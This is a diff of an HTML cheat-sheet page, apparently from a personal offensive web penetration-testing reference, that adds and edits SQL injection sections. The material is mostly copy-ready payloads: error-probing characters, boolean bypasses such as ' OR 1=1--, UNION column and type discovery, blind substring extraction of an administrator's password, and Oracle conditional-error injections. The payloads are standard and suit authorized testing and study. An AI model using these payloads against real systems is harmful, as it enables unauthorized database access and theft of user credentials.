@@ -40,11 +40,29 @@ alert("copied to clipboard.");
 <div class="column" style="display: inline-block; text-align: left; background-color:gray;">
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'" style="float: left;">&lt;&lt;</button><br><br>
 <details>
+<summary>DEFAULT TEST ATTEMPTS</summary>
+<p><b>DESCRIPTION:</b> List of the normal characters used to test the vulnerability. 
+	
+Getting errors can represent the presence of the vulnerability. [HTTP/2 500 Internal Server Error]
+	
+<b>C1: </b><p id="HDT001"><mark>'</mark></p>
+<b>C2: </b><p id="HDT002"><mark>''</mark></p>
+<b>C3: </b><p id="HDT003"><mark>"</mark></p>
+<b>C4: </b><p id="HDT004"><mark>'--</mark></p>
+<b>C5: </b><p id="HDT005"><mark>""</mark></p>
+<b>C6: </b><p id="HDT006"><mark>'#</mark></p>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT001')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT002')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT003')">.C3.</button>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT004')">.C4.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT005')">.C5.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT006')">.C6.</button></p>
+
+<b>NOTE:</b> It is needed to check the behavior of the application GUI and headers [burpsuite].
+	
+</details>
+<details>
 <summary>HIDDEN DATA TECHNIQUES</summary>
 <p><b>DESCRIPTION:</b> It will use some boolean conditions in order to retrieve content from the database.
 
-If the vulnerability is present the goal is to "close" the query and retrieve all, for that boolean 
-conditions are used.
+If the vulnerability is present the goal is to "close" the query and retrieve all, for that boolean conditions are used.
 	
 <b>C1: TRUE </b><p id="HDT01"><mark>' OR 1=1--</mark></p>
 <b>C2: TRUE </b><p id="HDT02"><mark>' and 'a'='a--</mark></p>
@@ -67,21 +85,21 @@ conditions are used.
 <b>--</b> or <b>#</b> | Are used in SQL query language to comment ignoring the rest of the query. <br>
 	
 <b>PRE-REQS:</b>
-<u>1. get column number</u>
+<u>1. GET COLUMN NUMBER</u>
 
 <b>C1: METHOD </b><p id="DTT01"><mark>' ORDER BY 1--</mark></p> 
 <b>C2: METHOD </b><p id="DTT02"><mark>' UNION SELECT NULL--</mark></p>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT01')">.C1.</button> |  <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT02')">.C2.</button><br>
 	
-<u>2. get field type</u>
+<u>2. GET FIELD TYPE</u>
 	
 <b>C1: STRING TEST</b><p id="DTT03"><mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark></p>
 <b>C2: STRING TEST</b><p id="DTT04"><mark>' UNION SELECT NULL,'a',NULL,NULL--</mark></p>
 <b>C3: ORACLE TEST</b><p id="DTT05"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT03')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT04')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT05')">.C3.</button>
 <br>
-<b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns
-is needed. Also, for ORACLE the select statement <u>is needed a table to search from</u>, it can be any table.
+<b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns is needed. 
+Also, for ORACLE the select statement <u>is needed a table to search from</u>, it can be any table.
 	
 <b>COMMON TESTS:</b>
 
@@ -143,23 +161,23 @@ is needed. Also, for ORACLE the select statement <u>is needed a table to search 
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT04')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT05')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT06')">.C3.</button></p>
 </details>
-<b>NOTE:</b> Both ways needs to know the column number, field type and both examples are assuming it has
-two columns and both type string.</p>
+<b>NOTE:</b> Both ways needs to know the column number, field type and both examples are assuming it has two 
+columns and both type string.</p>
 </details>
 <details>
 <summary>UNION ATTACKS TECHNIQUES</summary>
 <p><b>DESCRIPTION:</b> If the vulnerability is present, UNION attacks can be used to retrieve content
 from other tables.
 
-<b>STEP1:</b> get query columns number
+<b>STEP1:</b> GET QUERY COLUMNS NUMBER
 
 <b>C1: </b><p id="UAT01"><mark>' UNION SELECT NULL--</mark></p>
 *add null values until the error disappears
 
-<b>STEP2:</b> get column field type
+<b>STEP2:</b> GET COLUMN FIELD TYPE
 
-<b>C2: non-oracle </b><p id="UAT02"><mark>' UNION SELECT NULL,'a'--</mark></p>
-<b>C3: oracle</b><p id="UAT03"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p>
+<b>C2: NON-ORACLE </b><p id="UAT02"><mark>' UNION SELECT NULL,'a'--</mark></p>
+<b>C3: ORACLE</b><p id="UAT03"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p>
 *assuming two columns
 
 ... after those steps, please refer to <b>LISTING DATABASE CONTENT TECHNIQUES</b>, it will apply the same.
@@ -188,6 +206,7 @@ To successfully acomplish the blind attack, the boolean conditions can help. It 
 
 <b>C1: TRUE condition means column value exist ![guess or enumerate]</b><p id="BAT04"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a</mark></p>
 <b>SAMPLE: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</mark>
+
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT04')">.C1.</button> 
 
 <u>CHECK THE CHARACTER LENGHT OF THE COLUMN VALUE ?</u>
@@ -198,14 +217,15 @@ To successfully acomplish the blind attack, the boolean conditions can help. It 
 
 <b>NOTE:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
 hits the FALSE statement.
-
+<br>
 > <u>CHECK CHARACTERS VALUE USING A METHOD "GREATHER THAN" AND "EQUALS" ?</u>
 <b>C1: </b><p id="BAT11"><mark>' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) > 'value</mark></p>
 <b>SAMPLE: </b><mark>' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't</mark>
 
-"first it needs a TRUE/FALSE behavior [blind sqli identified], if true the first character of the value is greather than the value...
+"first it needs a TRUE/FALSE behavior [blind sqli identified], if true the first character of the value is 
+greather than the value...
 
-<b>C2: </b><code><p id="BAT12"><mark>' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) = 's</mark></p></code>
+<b>C2: </b><p id="BAT12"><mark>' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) = 's</mark></p>
 <b>SAMPLE: </b><mark>' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's</mark>
 
 ...if TRUE the first character of the value is equals to the value"
@@ -213,8 +233,8 @@ hits the FALSE statement.
 <b>NOTE:</b> or "SUBSTR"
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT11')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT12')">.C2.</button>
-
-> <u>check the characters of the column ?</u>
+<br>
+> <u>CHECK THE CHARACTERS OF THE COLUMN ?</u>
 <b>C1: </b><p id="BAT08"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,1,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§</mark></p>
 <b>SAMPLE: </b><mark>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</mark>
 
@@ -235,6 +255,31 @@ values are correct = TRUE.
 <details>
 <summary>CONDITIONAL ERRORS</summary>
 
+<b>NOTE:</b> [HTTP/2 500 Internal Server Error], error will act similar to the TRUE/FALSE logic. If error
+appears, FALSE If not, TRUE. 
+
+> <u>CONFIRM SERVER IS INTERPRETING THE INJECTION AS A SQL QUERY</u>
+<b>C1: NON-ORACLE </b><p id="BAT008"><mark>'||(SELECT '')||'</mark></p>
+<b>C2: ORACLE </b><p id="BAT009"><mark>'||(SELECT '' FROM dual)||'</mark></p>
+	
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT008')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT009')">.C2.</button>
+
+> <u>CONFIRM IF TABLE EXISTS ?</u>
+<b>C1: NON-ORACLE </b><p id="BAT010"><mark>'||(SELECT '' FROM TABLE_NAME WHERE ROWNUM = 1)||'</mark></p>
+<b>SAMPLE: </b><mark>'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</mark>
+
+<b>NOTE:</b> WHERE ROWNUM = 1 prevents break concatenation. If error is present table does not exist, if not
+you can infer the table exist. 
+	
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT010')">.C1.</button>
+
+<b>CONDITIONS: </b> 
+
+<b>C1: TRUE = ERROR</b><p id="BAT011"><mark>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</mark></p>
+<b>C2: FALSE = NO ERROR</b><p id="BAT012"><mark>'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</mark></p>
+
+<b>NOTE: </b> If that's OK, you can trigger an error conditionally on the truth of a specific condition.
+	
 </details>	
 </p>
 </details>
